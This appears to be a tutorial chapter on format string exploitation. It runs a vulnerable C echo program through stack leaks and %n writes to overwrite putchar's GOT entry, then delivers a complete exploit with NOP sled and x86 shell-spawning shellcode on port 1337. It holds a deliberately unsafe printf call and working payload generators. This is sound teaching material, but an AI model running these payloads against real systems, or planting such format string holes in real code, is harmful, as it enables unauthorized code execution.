### 5. Format String Attacks

##### The vulnerable program

This is a simple C program that echoes whatever you pass to it. 

```
#include <stdio.h>

int main(int argc, char *argv[]) {
	char buf[1024];
	strcpy(buf, argv[1]);
	printf(buf);
	printf("\n");

  return 0;
}
```

##### Setting up our exploit workflow

This is a helper that will run execute() functions in modules called exploit1 exploit2 etc.

```
#!/usr/bin/python
# exploit.py
#

import argparse

def main(phase):
	module = 'exploit{}'.format(phase)
	payload = getattr(__import__(module), 'execute')()
	if payload:
		with open("exploit", "wb") as f:
			f.write(payload)

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('phase', type=int)
	args = parser.parse_args()
	main(args.phase)
```

```
$ touch exploit
$ alias p6fmt="env - PWD=$PWD /home/jc/exploitdev/p6fmt/p6fmt"
$ p6fmt hello
hello
$
```
```
$ env - gdb
(gdb) source ~/.gdbinit
gdb-peda$ file p6fmt
Reading symbols from p6fmt...done.
gdb-peda$
```

##### Understanding the vulnerability

This program is using printf in an unsafe way. The user controls the format string that is being used. If we submit format string syntax to the program, we can see this in action:

```
%x prints memory addresses off of the stack
./p6fmt %x.%x.%x
bffff2b4.b7de3dc8.400577

%n writes values to memory. We can cause a segfault using them
./p6fmt %n%n
Segmentation fault (core dumped)
```

If we submit AAAA followed by %x format specifiers, we can find how far down the stack our input is:
```
./p6fmt AAAA%x.%x.%x.%x
AAAAbffff2ad.b7de3dc8.400577.41414141
```
In this case, AAAA is the 4th value on the stack. You can also use a shortcut like so (The $ is escaped in bash.):
```
./p6fmt AAAA.%4\$x
AAAA.41414141
```

##### Automating finding the offset for a format string vulnerability
```
#!/usr/bin/python
#
# Phase 1: Finding the number of specifiers before we have control.

import subprocess

def execute():
	payload = "AAAA"
	n = 0
	while True:
		proc = subprocess.Popen(["./p6fmt", payload],
			stdout=subprocess.PIPE)
		out, err = proc.communicate()
		if "41414141" in out:
			print("Control value at {} specifiers.".format(n))
			print("AAAA.%{}$x: AAAA.41414141".format(n))
			break
		n += 1
		payload += ".%x"
```
Output:
```
python exploit.py 1
Control value at 4 specifiers.
AAAA.%4$x: AAAA.41414141
 
./p6fmt AAAA.%4\$x
AAAA.41414141
```

##### Writing to memory

If we disassemble the main function in gdb, we see that there is a call to putchar after printf. String format vulnerabilities allow writing to memory, so if we can write an address to putchar we can control execution of the program.

We first find the location of putchar:
```
objdump -R ./p6fmt | grep putchar
080497b4 R_386_JUMP_SLOT   putchar@GLIBC_2.0
```

```
#!/usr/bin/python
# 
# Phase 2: Writing to putchar PLT entry

import struct

# We control the value at position 4 on the stack.
# In order to write to memory, we need to use 4 specifiers TOTAL.
# Must end with %n to write bytes to the memory location in our input.

# objdump -R ./p6fmt | grep putchar
# 080497b4 R_386_JUMP_SLOT   putchar@GLIBC_2.0

def execute():
	destination = struct.pack("I", 0x080497b4)
	payload = destination + "%x%x%x%n"
	return payload
```

If we set breakpoints in gdb before and after printf, we can see that we are overwriting the address!

```
putchar before printf : 0x08048346
putchar after printf  : 0x0000001b
```

##### Overwriting putchar

In order to overwrite the address at putchar, we will write one byte at a time.
Here is our baseline:

```
#!/usr/bin/python
# 
# Phase 3: Finding the lower byte

import struct

def execute():
	putchar = 0x080497b4
	destinations = [struct.pack("I", putchar + n) + 
		"JUNK" for n in range(4)]
	payload = "".join(destinations)
	payload += "%x%x%x%n" # 1st byte
	payload += "%x%n" # 2nd byte
	payload += "%x%n" # 3rd byte
	payload += "%x%n" # 4th byte
	return payload	
```

```
putchar before printf : 0x08048346
putchar after printf  : 0x4f473f37
```

We have successfully written a new address! Pay attention to the last byte. It will be important later.

##### Finding the offset

The next step is to figure out what the default width of the format specifier is. We can do this by padding the input and comparing the new byte values.

```
#!/usr/bin/python
# 
# Phase 4: Finding the default width

import struct

def execute():
	putchar = 0x080497b4
	destinations = [struct.pack("I", putchar + n) + 
		"JUNK" for n in range(4)]
	payload = "".join(destinations)
	payload += "%x%x%10x%n" # 1st byte
	payload += "%x%n" # 2nd byte
	payload += "%x%n" # 3rd byte
	payload += "%x%n" # 4th byte
	return payload	
```

Here we have padded the format specifier by 10 before writing to the address.

```
putchar with default width %x : 0x4f473f37
putchar with width of %10x: 0x524a423a
```
Compared to the baseline, each byte increased by 3. This means that the default width is 7.

##### Writing the address we want

Let's try writing the address 0xaabbccdd to putchar. 
In order to do so, we need to do some math.

Recall that the baseline value was 0x4f473f37. 
If we take just the last byte, we have 0x37.
Our target is 0xdd. 

If we write 0x100 + 0xdd, we will have 0xdd in the lower bit, which is what we want. We can use the same pattern to reset the values in the lower bit (256 * 2, 256 * 3, etc.)

However, we have to remember that we wrote a total number of bytes with 0x37 in the lower byte. We also need to account for the default width being 7, so to line everything up, we need an offset of 0x30 (0x37 - 0x7).

In addition, we also need to keep track of the total padding being added and subtract it from the result to keep the previous bytes from being changed.

So if you put it all together:

```
#!/usr/bin/python
# 
# Phase 5: Writing an address to putchar

import struct

def execute():
	putchar = 0x080497b4
	to_write = 0xaabbccdd
	lower_byte = 0x37
	default_width = 0x7

	payload = ""	

	destinations = [struct.pack("I", putchar + n) + 
		"JUNK" for n in range(4)]
	payload = "".join(destinations)
	payload += "%x%x"

	targets = []
	while to_write > 0:
		targets.append(to_write & 0xff)
		to_write >>= 8

	total_padding = 0
	offset = lower_byte - default_width
	for n, target in enumerate(targets, 1):
		padding = (256 * n) + target - total_padding - offset
		payload += "%{}x%n".format(padding)
		total_padding += padding
	
	return payload
```

```
putchar before printf : 0x08048346
putchar after prinft  : 0xaabbccdd 
```

Success! Now we can control EIP!

##### Shellcode

Now it's just a matter of putting the shellcode on the stack with a nopsled, writing the memory address of somewhere in the nop sled to putchar and we're golden.

The final code is below, which opens a TCP reverse shell on port 1337 on localhost.

```
#!/usr/bin/python
# 

import struct

putchar = 0x080497b4
to_write = 0xbffff930
lower_byte = 0x37
default_width = 0x7

nopsled = "\x90" * 128
PORT = "\x05\x39" # 1337
shellcode = (
"\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3" +
"\x01\x51\x53\x6a\x02\x89\xe1\xcd\x80" +
"\x89\xc7\xb0\x66\x5b\x31\xd2\x52\x66" +
"\x68" + PORT + "\x66\x53\x89\xe1\x6a" +
"\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0" +
"\x50\x57\x89\xe1\x43\x43\xb0\x66\xcd" +
"\x80\x31\xd2\x52\x52\x57\x43\x89\xe1" +
"\xb0\x66\xcd\x80\x93\x31\xc9\xb1\x02" +
"\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68" +
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e" +
"\x89\xe3\x89\xd1\xb0\x0b\xcd\x80"
)

def execute():
	return write_address() + nopsled + shellcode

def write_address():
	payload = ""	

	destinations = [struct.pack("I", putchar + n) + 
		"JUNK" for n in range(4)]
	payload = "".join(destinations)
	payload += "%x%x"

	targets = []
	global to_write
	while to_write > 0:
		targets.append(to_write & 0xff)
		to_write >>= 8

	total_padding = 0
	offset = lower_byte - default_width
	print("offset: {}".format(offset))
	for n, target in enumerate(targets, 1):
		padding = (256 * n) + target - total_padding - offset
		payload += "%{}x%n".format(padding)
		total_padding += padding
	
	return payload
```
